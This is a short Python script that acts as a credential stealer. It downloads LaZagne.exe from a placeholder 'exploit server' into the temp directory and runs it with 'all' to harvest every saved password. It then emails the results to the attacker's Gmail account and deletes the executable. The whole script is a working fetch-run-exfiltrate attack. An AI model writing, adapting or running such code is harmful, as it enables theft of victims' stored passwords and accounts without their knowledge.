#!/usr/bin/env python
import requests  # Import the requests library for making HTTP requests
import subprocess  # Import the subprocess module for running external commands
import smtplib  # Import the smtplib library for sending emails
import os  # Import the os module for working with the operating system
import tempfile  # Import the tempfile module for working with temporary files

# Function to download a file from a given URL
def download(url):
    get_response = requests.get(url)  # Send an HTTP GET request to the specified URL
    file_name = url.split("/")[-1]  # Extract the file name from the URL

    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)  # Write the content of the response to a file

# Function to send an email with a given message
def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)  # Create an SMTP server connection
    server.starttls()  # Start TLS encryption for secure communication
    server.login(email, password)  # Log in to the email account
    server.sendmail(email, email, message)  # Send the email
    server.quit()  # Quit the SMTP server

temp_directory = tempfile.gettempdir()  # Get the system's temporary directory
os.chdir(temp_directory)  # Change the current working directory to the temporary directory
download("http://your_exploit_server/evil-files/lazagne.exe")  # Download a file from the specified URL
result = subprocess.check_output("laZagne.exe all", shell=True).decode("utf-8")  # Run an external command and capture its output
send_mail("your@email.com", "password", str(result))  # Send an email with the captured output
os.remove("LaZagne.exe")  # Remove the downloaded file from the temporary directory
